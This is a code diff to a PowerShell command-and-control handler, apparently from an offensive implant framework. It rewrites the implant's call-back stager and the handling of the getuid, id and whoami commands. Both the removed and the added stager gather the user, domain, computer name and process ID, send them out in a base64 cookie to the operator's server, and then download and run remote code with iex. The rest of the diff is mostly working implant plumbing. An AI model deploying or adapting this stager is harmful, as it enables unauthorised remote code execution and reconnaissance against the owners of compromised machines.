@@ -217,37 +217,23 @@ function Implant-Handler
     # run startup function
     startup
     # call back command
-    $command = '
-    function Get-Webclient 
-    {
-    Param
-    (
-    [string]
-    $Cookie
-    )
-    $wc = New-Object System.Net.WebClient; 
-    $wc.UseDefaultCredentials = $true; 
-    $wc.Proxy.Credentials = $wc.Credentials;
-    if ($cookie) {
-    $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-    }
-    $wc
-    }
-    function primer
-    {
-    $whoami = (whoami) -replace "`r|`n"
-    $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
-    $pretext64 = [Convert]::ToBase64String($pretext)
-    $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
-    $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
-    $primer
-    } 
-    $primer = primer
-    if ($primer) {$primer| iex} else {
-    start-sleep 10
-    primer | iex
-    }
-    '
+    $command = 'function Get-Webclient ($Cookie) {
+$wc = New-Object System.Net.WebClient; 
+$wc.UseDefaultCredentials = $true; 
+$wc.Proxy.Credentials = $wc.Credentials;
+if ($cookie) {
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+} $wc }
+function primer {
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$p64 = [Convert]::ToBase64String($pre)
+$pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
+$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
+$pm } 
+$pm = primer
+if ($pm) {$pm| iex} else {
+start-sleep 10
+primer | iex }'
 
     function Get-RandomURI 
     {
@@ -394,8 +380,7 @@ function Implant-Handler
             } 
             function primer
             {
-            $whoami = (whoami) -replace "`r|`n"
-            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$whoami;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
             $pretext64 = [Convert]::ToBase64String($pretext)
             $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
             $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
@@ -538,7 +523,9 @@ param
             }  
             if ($pscommand -eq 'getuid') 
             {
-                $pscommand = 'whoami'
+                $pscommand = 'fvdsghfdsyyh'
+                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
+                Write-Host $dbresult
             }  
             if ($pscommand -eq 'ps') 
             {
@@ -546,7 +533,15 @@ param
             }
             if ($pscommand -eq 'id') 
             {
-                $pscommand = 'whoami'
+                $pscommand = 'fvdsghfdsyyh'
+                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
+                Write-Host $dbresult
+            }
+            if ($pscommand -eq 'whoami') 
+            {
+                $pscommand = 'fvdsghfdsyyh'
+                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
+                Write-Host $dbresult
             }
             if ($pscommand -eq 'Kill-Implant') 
             {
